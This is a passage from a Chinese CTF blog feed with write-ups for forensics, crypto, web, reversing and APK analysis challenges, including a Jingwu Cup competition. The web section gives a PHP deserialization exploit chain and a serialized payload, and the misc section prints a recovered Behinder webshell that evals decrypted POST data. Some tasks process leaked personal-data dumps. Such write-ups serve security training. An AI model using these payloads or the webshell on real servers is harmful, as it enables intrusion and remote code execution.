alt="img"> </p><h3 id="内存取证3"><a href="#内存取证3" class="headerlink" title="内存取证3"></a><strong>内存取证3</strong></h3><pre><code>问题3：找到镜像中隐藏的flag，提交答案格式为flag&#123;中文&#125;</code></pre><p>从第一题找到的xls入手分析</p><p>先导出分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722023.jpg" alt="img"> </p><p>改xls后缀名 打开要密码 尝试用上面的mysql登录密码 打开找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021282.jpg" alt="img"> </p><p>utf-7编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722024.jpg" alt="img"> </p><h3 id="取证分析1"><a href="#取证分析1" class="headerlink" title="取证分析1"></a><strong>取证分析1</strong></h3><pre><code>某单位员工使用edge浏览器访问了钓鱼站点，导致edge进程崩溃了，员工的电脑上设置了程序崩溃自动保存内存dump文件。请通过该文件，对该事件进行分析。 问题1：小A访问的钓鱼网站网址是什么？提交答案格式为flag&#123;url&#125;，比如flag&#123;http://a.b.c.d:1234/x.html&#125;</code></pre><p>vol和AXIOM都分析不了 只能直接strings </p><p>Plain Text strings edge.dmp | grep “http:&#x2F;&#x2F;“</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021285.jpg" alt="img"> </p><h3 id="取证分析2"><a href="#取证分析2" class="headerlink" title="取证分析2"></a><strong>取证分析2</strong></h3><pre><code>问题2：对方在edge进程中执行了shellcode，似乎是执行命令失败了，找出他执行命令调用的win32 api。提交答案格式为flag&#123;api&#125;，比如flag&#123;kernel32!RtlCaptureContext&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021771.jpg" alt="img"> </p><p>Bash kernel32!WinExec</p><h3 id="取证分析3"><a href="#取证分析3" class="headerlink" title="取证分析3"></a><strong>取证分析3</strong></h3><pre><code>问题3：找出对方想要执行的命令行内容，提交答案格式为flag&#123;钓鱼站点想要执行的命令行内容&#125;，命令中若存在空格请使用_代替，其他符号不变，区分大小写，格式如flag&#123;cmd_/c_ip_tables!&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021777.jpg" alt="img"> </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="Easyrsa"><a href="#Easyrsa" class="headerlink" title="Easyrsa"></a><strong>Easyrsa</strong></h3><pre><code>from itertools import permutations from Crypto.Util.number import *  z = [&#39;0111101011111101000011111100011110110111100011001110111101110110110001110111000100101100110101001010101100011100110110011011111110110111010000000011010010100000110101110011101000100100100011101101100010100001010100000000010000100101111100111111111101111010&#39;, &#39;1101000000101000011011010111111110011110001001101011001011000101110000010100100011011101011101011110001010111111111111011110000110111011010011000110111010010110000101001000000101010011000100111000111001001100011010100011100000000010100011100000111110001110&#39;, &#39;1010011111001110000111011001100100011011011000101010010000001011010011011111010001000101110101010101011101011110101101011010110101010000010100010111111111101110010110011001111010000100100011011100000111110001110000010001010101101101101110000011011000101011&#39;, &#39;0100110010000010001110101000101000111011111110000001000001100010000000111111101100100111110011000100111010101000100011001110101100001011110010111000010001001010010000000011111000101011111010111101000001000000001101100100101001100010000100001111100111111010&#39;, &#39;0111001101001010111111101010011101100000011001101111011010001000110010111010111111101000000001001011000001000110100111110001000011011000011110110101100100101011101010110001110110010000100001101110000000100011011101110111011111011000001100001000000110110011&#39;, &#39;0110111010001001010000000001000001100110100100010010011100110011101111000101110100000000000100010111111110001010111111010111011011001001010110110000110001010011000111010110100100010100100111100101001010101011011110001101110101100010110010111100100101010111&#39;, &#39;1011101011100010101111010010000100010011111101101011011110000010010000011101010001001010000000111100000100001011001111100100000100101001111010010110000001010101111110111001011111000110110110100101111000010000100010010111010000100110010100011000000100001111&#39;, &#39;1001101111111001100011101111011101101011100110100011000100111100010101011001100001011000110110000000101011010100110001110000110001110111111001010010101000100110011010111101101101001101011111000111010000110001110000000001000111000001011110010000001111010011&#39;] c = 13003314666259100924056004488192879951991824059911508262140097706018888705955470264051361935101455340094971529836127008746457786892275972565449113840328391209339169000395470738780766025271862970759571146381234096267258200970822986151050047882589038375903133053657805275788419550498651112234266443422536799276888423014856283593968916394415760552426237539489292338903806512371485857542164997008922471994591413796274552848851859976522014922044409925823881793117165653534217369362159387632321283129023449326780775659395803089477090226867368824000190350663854144716638637456141115609096321561091304903356851544525526615903 e = 65537  for perm in permutations(z, r=8):   group1 = perm[:4]    group2 = perm[4:]      p_str = &#39;&#39;.join(group1)   q_str = &#39;&#39;.join(group2)    p = int(p_str, 2)   q = int(q_str, 2)    phi_n = (p - 1) * (q - 1)   d = pow(e, -1, phi_n) if phi_n != 0 else None    if d is None:     continue   m = pow(c, d, p * q)    decrypted_message = long_to_bytes(m)   if b&#39;flag&#39; in decrypted_message:     print(decrypted_message)     break </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021781.jpg" alt="img"> </p><h3 id="Ecc"><a href="#Ecc" class="headerlink" title="Ecc"></a><strong>Ecc</strong></h3><p>板子题</p><pre><code>from Crypto.Util.number import * #1 p = 49383540788757109209399937015403058078091585436614706959465496296978436108887 a = 55685723875233231914244109412725461970324405506250247848835714736428531894083 b = 14465416621366336584787787222004413359301857947979225099379614554383512880491 k = 17863723127130927912437094121795715840619733807126707833630214910470361917913 E = EllipticCurve(GF(p),[a,b]) c1 = E([41878742451091353952894887712068645971005265624587580702506356899238014833578, 33882347397378893053663991901529711743049843524447349970546724946010958254490]) c2 = E([32044441001201280220364823846903588184438951716534669244501751822900705328405, 20808501842510819101565506724685661870434821018672081897206182291278825489793]) cipher = 8126088154459418019024039065681028044223135048676741656267021276727337263061 m = c1 - k * c2 num1 = cipher//m[0]   # 2 p=12506217790875063466368723611056175369923 A=12506217790875063466368723611052784275139 B=12506217790875063466368723533070038257347 E = EllipticCurve(GF(p),[A,B]) P = E(12209581121985501571384146459209070740325, 343933414533064030464400914099323495391) Q = E(6578542526388549877571325989098572012221, 1792660825364939960209890135582772010119)  def SmartAttack(P,Q,p):   E = P.curve()   Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)   for P_Qp in P_Qps:     if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:       break    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)   for Q_Qp in Q_Qps:     if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:       break    p_times_P = p*P_Qp   p_times_Q = p*Q_Qp    x_P,y_P = p_times_P.xy()   x_Q,y_Q = p_times_Q.xy()    phi_P = -(x_P/y_P)   phi_Q = -(x_Q/y_Q)   k = phi_Q/phi_P   return ZZ(k)  num2 = SmartAttack(P, Q, p)  print(long_to_bytes(int(num1))+long_to_bytes(int(num2)))</code></pre><p><a href="https://blog.csdn.net/XiongSiqi_blog/article/details/132005590#_2021ecc_209">https://blog.csdn.net/XiongSiqi_blog/article/details/132005590#_2021ecc_209</a></p><p>分别是HGAME2022week4 ECC和 第五空间2021 ecc的第三部分</p><pre><code>flag&#123;1eo0kuvanq6vghtlpswe&#125;</code></pre><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="Unser"><a href="#Unser" class="headerlink" title="Unser"></a><strong>Unser</strong></h3><p>原题 没什么好说的  照着打就行了</p><p><a href="https://blog.csdn.net/qq_51768842/article/details/125153850">https://blog.csdn.net/qq_51768842/article/details/125153850</a></p><pre><code>poc  &lt;?php   highlight_file(__FILE__);   class wel &#123;   public $fast;   public $star;     public function __construct()   &#123;     $this-&gt;fast = &#39;free__toto&#39;;     echo $this-&gt;fast;     echo &quot;what?&quot;;   &#125;     public function __destruct()   &#123;     $content = $this-&gt;star;     printf($content);   &#125;     public function ctf()   &#123;     echo &#39;welcome?&#39;;   &#125;   &#125;   class  database &#123;   public $hostname = &#39;127.0.0.1&#39;;   public $dbuser = &#39;root&#39;;   public $dbpass = &#39;root&#39;;   public $database;   public $str;   public $challange;     public function __construct($database)   &#123;     $this-&gt;database = $database;   &#125;     public function __invoke()   &#123;     function welcome()     &#123;       echo &#39;do_it?&#39;;     &#125;       $this-&gt;str-&gt;open($this-&gt;database);     &#125;   &#125;   class flag &#123;   public $file;   public $params;     public function __construct()   &#123;     $this-&gt;file = array();   &#125;     public function __toString()   &#123;     return $this-&gt;getfunction();   &#125;     public function getfunction()   &#123;     $func = $this-&gt;params;     echo &#39;you win?&#39;;     $func();   &#125;   &#125;   $w=new wel(); $w-&gt;star=new flag(); $w-&gt;star-&gt;params=new database(&#39;fl@g.php&#39;); $w-&gt;star-&gt;params-&gt;str=new SQLite3(&#39;fl@g.php&#39;); echo serialize($w);</code></pre><pre><code>exp  noway=O:3:&quot;wel&quot;:2:&#123;s:4:&quot;fast&quot;;s:10:&quot;free__toto&quot;;s:4:&quot;star&quot;;O:4:&quot;flag&quot;:2:&#123;s:4:&quot;file&quot;;a:0:&#123;&#125;s:6:&quot;params&quot;;O:8:&quot;database&quot;:6:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:8:&quot;fl@g.php&quot;;s:3:&quot;str&quot;;O:7:&quot;SQLite3&quot;:0:&#123;&#125;s:9:&quot;challange&quot;;N;&#125;&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722025.jpg" alt="img"> </p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a><strong>easyre</strong></h3><p>有py特征</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021816.jpg" alt="img"> </p><p>转储</p><p>Bash objcopy –dump-section pydata&#x3D;pydata.dump file.elf</p><p>再用pyinstxtractor拆包</p><p>拿到pyc文件反编译看源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722026.jpg" alt="img"> </p><p>import了一叫touch的so库文件</p><p>定位到jiami函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021944.jpg" alt="img"> </p><p>定位密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021343.jpg" alt="img"> </p><p>exp:</p><p>Python print(‘’.join([chr(i&#x2F;&#x2F;2 ^ 0x25) for i in [0x86, 0x92, 0x88, 0x84, 0xBC, 0xEA, 0xB8, 0xF4, 0x28, 0x2C, 0xF4, 0x2C, 0xCA, 0xAC, 0xB8, 0xF4, 0xC2, 0x2A, 0x96, 0x24, 0xF4, 0xE2, 0x2A, 0xA0, 0x2E, 0x9A, 0xF4, 0xD0, 0x2C, 0xF4, 0xC8, 0x84, 0x88, 0x98, 0x96, 0x08, 0xB0]]))</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="LL"><a href="#LL" class="headerlink" title="LL"></a><strong>LL</strong></h3><p>发现问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722027.jpg" alt="img"> </p><p>搜一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722028.jpg" alt="img"> </p><p>第105流 得知解密流程分3步</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021694.jpg" alt="img"> </p><p>在第104流找到密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021963.jpg" alt="img"> </p><p>直接赛博厨子解<a href="https://wikipedia.org/wiki/Quoted-printable">Quoted-printable</a> 解密后的内容单独保存出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021374.jpg" alt="img"> </p><p>看着像base64 继续解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722029.jpg" alt="img"> </p><p>这里发现又将一个base64的内容写入了about.php中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722031.jpg" alt="img"> </p><p>继续解base64 是一个冰蝎解密脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021431.jpg" alt="img"> </p><pre><code>&lt;?php @error_reporting(0); session_start();   $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond     $_SESSION[&#39;k&#39;]=$key;     session_write_close();     $post=file_get_contents(&quot;php://input&quot;);     if(!extension_loaded(&#39;openssl&#39;))     &#123;         $t=&quot;base64_&quot;.&quot;decode&quot;;         $post=$t($post.&quot;&quot;);                  for($i=0;$i&lt;strlen($post);$i++) &#123;                $post[$i] = $post[$i]^$key[$i+1&amp;15];                &#125;     &#125;     else     &#123;         $post=openssl_decrypt($post, &quot;AES128&quot;, $key);     &#125;   $arr=explode(&#39;|&#39;,$post);   $func=$arr[0];   $params=$arr[1];     class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;   @call_user_func(new C(),$params); ?&gt;</code></pre><p>得知密码是rebeyond 直接用puzzlesolver就可以爆破解密</p><p>直接翻到最后一个流 先解密请求包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021544.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021955.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722032.jpg" alt="img"> </p><p>两次base64解密 发现确实是在读取flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021115.jpg" alt="img"> </p><p>那最后一个返回包就是flag的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722033.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722034.jpg" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第七届精武杯-西柚喵帕斯wp</title>
      <link href="/2024/05/03/%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AF-%E8%A5%BF%E6%9F%9A%E7%9A%84%E5%96%B5%E5%B8%95%E6%96%AFWP/"/>
      <url>/2024/05/03/%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AF-%E8%A5%BF%E6%9F%9A%E7%9A%84%E5%96%B5%E5%B8%95%E6%96%AFWP/</url>
      
        <content type="html"><![CDATA[<h1 id="第七届精武杯-西柚的喵帕斯WP"><a href="#第七届精武杯-西柚的喵帕斯WP" class="headerlink" title="第七届精武杯-西柚的喵帕斯WP"></a>第七届精武杯-西柚的喵帕斯WP</h1><p><strong>计算机&amp;&amp;手机</strong></p><p><strong>1. 请综合分析计算机和手机检材，计算机最近一次登录的账户名是</strong></p><pre><code>admin</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730494.jpg" alt="img"> </p><p><strong>2.请综合分析计算机和手机检材，计算机最近一次插入的USB存储设备串号是</strong></p><pre><code>S3JKNX0JA05097Y</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730353.jpg" alt="img"> </p><p><strong>3.请综合分析计算机和手机检材，谢弘的房间号是（）室</strong></p><pre><code>201</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730356.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730364.jpg" alt="img"> </p><p><strong>4.请综合分析计算机和手机检材，曹锦芳的手机号后四位是</strong></p><pre><code>0683</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945444.jpg" alt="img"></p><h3 id="5-请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名-电话-地址去重后共有多少条？"><a href="#5-请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名-电话-地址去重后共有多少条？" class="headerlink" title="5.请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？"></a>5.<strong>请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？</strong></h3><pre><code>4997条</code></pre><p>全部提取出来 其中顺丰2k是伪加密 改一下就可以正常解压 顺丰1k直接修改后缀名为<code>xlsx</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261733131.png" alt="image-20240426173356074"></p><p>使用网钜数据分析 导入4个excel表格</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261735436.png" alt="image-20240426173535343"></p><p>由于没有表头 所以需要再算上第一行 一共是4997条数据</p><p><strong>6.请综合分析计算机和手机检材，统计检材内共有几份购票平台相关的公民信息文档</strong></p><p>3份</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731735.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731736.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945290.jpg" alt="img"> </p><p><strong>7.请综合分析计算机和手机检材，樊海锋登记的邮箱账号是</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945827.jpg" alt="img"> </p><p><strong>8.请综合分析计算机和手机检材，统计购票平台相关的文档，去重后共有多少条身份证号为上海的公民信息？</strong></p><p>先搜一下身份证为上海的特征</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731743.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731754.jpg" alt="img"> </p><pre><code class="python">import pandas as pd  # 读取txt文件 data = pd.read_csv(&#39;12306 裤子1.txt&#39;, delimiter=&#39;----&#39;, header=None, engine=&#39;python&#39;)  # 将数据存储到xlsx文件中 data.to_excel(&#39;output.xlsx&#39;, index=False)  # 对第四列进行去重处理 data.drop_duplicates(subset=[3], keep=&#39;first&#39;, inplace=True)  # 筛选出上海公民shanghai_citizens = data[data[3].str.startswith(&#39;31&#39;)]  # 将上海公民的数据存储到一个新的xlsx文件中 shanghai_citizens.to_excel(&#39;shanghai_citizens.xlsx&#39;, index=False) </code></pre><p>跑出来109个</p><p><strong>9.请分析手机检材，2022年11月7日，嫌疑人发送了几条短信？</strong></p><p>3条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731916.jpg" alt="img"> </p><p><strong>10.请分析手机检材，其中保存了多少条公民住房信息？</strong></p><p>张三 李四 王武 范宏伟 郭何 章衡 关星 常见 余辉遥 陈剑 吴涵 张智  12个人 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731003.jpg" alt="img"></p><h2 id="apk功能分析"><a href="#apk功能分析" class="headerlink" title="apk功能分析"></a>apk功能分析</h2><h3 id="1、请分析1-备忘录-apk反编译出的文件中，正确答案在哪个文件里？"><a href="#1、请分析1-备忘录-apk反编译出的文件中，正确答案在哪个文件里？" class="headerlink" title="1、请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？"></a>1、<strong>请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？</strong></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032156946.png" alt="图片"></p><h3 id="2、请分析1-备忘录-apk并找到程序中的主activity是？（答案格式：com-tencent-mm-activity）"><a href="#2、请分析1-备忘录-apk并找到程序中的主activity是？（答案格式：com-tencent-mm-activity）" class="headerlink" title="2、请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）"></a>2、<strong>请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）</strong></h3><pre><code class="Plain">com.hl.memorandum.MainActivity</code></pre><h3 id="3、请分析1-备忘录-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#3、请分析1-备忘录-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="3、请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>3、请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;d0b2058a-ac29-11ed-807f-acde48001122&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157566.png" alt="图片"></p><h3 id="4、请分析2-easyapk-apk中SharedPreferences配置文件的名称-包括后缀-是什么"><a href="#4、请分析2-easyapk-apk中SharedPreferences配置文件的名称-包括后缀-是什么" class="headerlink" title="4、请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么?"></a>4、<strong>请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么?</strong></h3><p>MT管理器查看data&#x2F;data&#x2F;&lt;包名&gt;&#x2F;shared_prefs&#x2F;</p><pre><code class="Plain">myprefs.xml</code></pre><h3 id="5、请分析2-easyapk-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#5、请分析2-easyapk-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="5、请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>5、请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;55c99ed4-d894-ae59-3a3b-6fe3eed793e7&#125;</code></pre><p>看一下发现equal明文比对</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157866.png" alt="图片"></p><p>用frida hook equal函数拦截返回值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157414.png" alt="图片"></p><p>其实还有一个思路直接去找对应的str1-str5的值</p><h3 id="6、-请分析3-verify-apk，该程序中所使用的AES加密KEY值为"><a href="#6、-请分析3-verify-apk，该程序中所使用的AES加密KEY值为" class="headerlink" title="6、 请分析3.verify.apk，该程序中所使用的AES加密KEY值为"></a>6、 请分析3.verify.apk，该程序中所使用的AES加密KEY值为</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157389.png" alt="图片"></p><h3 id="7、请分析3-verify-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#7、请分析3-verify-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="7、请分析3.verify.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>7、请分析3.verify.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;301b6b90-ac37-11ed-bad4-5811224dd424&#125;</code></pre><p>先用上一题拿到的key解aes</p><pre><code class="Python">from Crypto.Cipher import AESimport base64def decrypt_aes(key, iv, ciphertext):    cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))    plaintext = cipher.decrypt(ciphertext)    return plaintext.rstrip(b&#39;\0&#39;)def main():    # AES key，IV 和 ciphertext（密文）    key = b&#39;thisisyouraeskey&#39;    iv = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]    ciphertext = base64.b64decode(b&#39;tPbnK29ENaqgPANeD1Hud3KyiS4uf8oaSa0b6ldRDHs=&#39;)    # 解密    decrypted_data = decrypt_aes(key, iv, ciphertext)    print(decrypted_data.decode(&#39;utf-8&#39;))if __name__ == &quot;__main__&quot;:    main()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158767.png" alt="图片"></p><p>接下来是misc……</p><p>拆包apk后找到一个lookme文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158212.png" alt="图片"></p><p>winhex打开发现是7z文件头</p><p>改后缀输入密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158828.png" alt="图片"></p><p>得到lookme.txt，内容为flag</p><h3 id="8、请分析4-easyjni-zip-压缩包中数据库的解密秘钥为"><a href="#8、请分析4-easyjni-zip-压缩包中数据库的解密秘钥为" class="headerlink" title="8、请分析4.easyjni.zip,压缩包中数据库的解密秘钥为"></a>8、请分析4.easyjni.zip,压缩包中数据库的解密秘钥为</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032200401.png" alt="图片"></p><p>找到密钥的获取函数<br>编写frida脚本</p><pre><code>setImmediate(function () &#123;   Java.perform(function () &#123;        var SQLiteOpenHelper = Java.use(&quot;net.sqlcipher.database.SQLiteOpenHelper&quot;);//获取类的引用        SQLiteOpenHelper.getWritableDatabase.overload(&#39;java.lang.String&#39;).implementation = function (password) &#123;//拦截getWritableDatabase方法的调用并指定参数类型           console.log(&quot;SQLiteOpenHelper.getWritableDatabase is called: password=&quot; + password);           var result = this.getWritableDatabase(password);           console.log(&quot;SQLiteOpenHelper.getWritableDatabase result=&quot; + result);           return result;        &#125;;    &#125;);&#125;);</code></pre><p>再根据判断条件构造符合要求的un和pw</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032159425.png" alt="图片"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032201396.png" alt="图片"></p><h3 id="9、请分析4-easyjni-zip并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#9、请分析4-easyjni-zip并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="9、请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>9、请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032159511.png" alt="图片"></p><p>解密数据库拿到加密的账号密码：</p><p>账号密码的加密算法在 so 文件中，分析 so 文件，对字符串的每一位进行了加<br>减 以及位置交换等操作，最后进行了 Base64 换表加密。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032201251.png" alt="图片"></p><pre><code class="python">import base64base64_chars = list(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;)a = base64_chars[3]base64_chars[3] = base64_chars[6]base64_chars[6] = aa = base64_chars[7]base64_chars[7] = base64_chars[9]base64_chars[9] = aa = base64_chars[20]base64_chars[20] = base64_chars[21]base64_chars[21] = aa = base64_chars[26]base64_chars[26] = base64_chars[1]base64_chars[1] = aa = base64_chars[30]base64_chars[30] = base64_chars[39]base64_chars[39] = aa = base64_chars[2]base64_chars[2] = base64_chars[48]base64_chars[48] = as1 = &quot;&quot;.join(i for i in base64_chars)s2 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#39;data = &quot;MXpjNjRjMzVyYl4zLmACMF8CXi1hMl9jXldbieFIRG91RJFJ&quot;result = list(base64.b64decode(data.translate(str.maketrans(s1, s2)).encode(&#39;utf-8&#39;)))pLen = len(result) - 11for j in range(0, pLen-1, 2): i = result[j] result[j] = result[j+1] result[j+1] = ifor i in range(0, int(pLen/2)): j = result[i] result[i] = result[pLen-1-i] result[pLen-1-i] = jfor i in range(pLen, pLen+11): result[i] = result[i] - 15for i in range(pLen): result[i] = result[i] + 3aa = &quot;&quot;.join(chr(i) for i in result)print(aa[-11:] + aa[:-11])</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032208256.png" alt="图片"></p><h3 id="10、请分析5-calc-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#10、请分析5-calc-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="10、请分析5.calc.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>10、请分析5.calc.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><p>Java 层只有验证输入是否正确的逻辑，算法都在 so 文件中。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209364.png" alt="图片"></p><p>可知这里是加密函数：<br>ida 不能 F5，分析得知是没有识别 switch 结构，自定义 switch 结构即可。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209496.png" alt="图片"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209496.png" alt="图片"></p><pre><code class="c">//反编译后的函数：__int64 sub_E7EC()&#123; __int64 v0; // x9 int i; // [xsp+1Ch] [xbp-24h] unsigned __int8 *v3; // [xsp+20h] [xbp-20h] __int64 v4; // [xsp+28h] [xbp-18h] int v5; // [xsp+30h] [xbp-10h] int v6; // [xsp+34h] [xbp-Ch] int v7; // [xsp+38h] [xbp-8h] v7 = 0; v6 = 0; v5 = 0; v4 = 0LL; v3 = (unsigned __int8 *)sub_EA34(); for ( i = 0; ; ++i ) &#123; if ( i &gt;= 418 ) return 1; if ( (unsigned int)byte_34000[i] - 1 &lt;= 0xDuLL ) break;LABEL_20: ; &#125; switch ( (unsigned int)jpt_E874 ) &#123; case 0u: v4 ^= 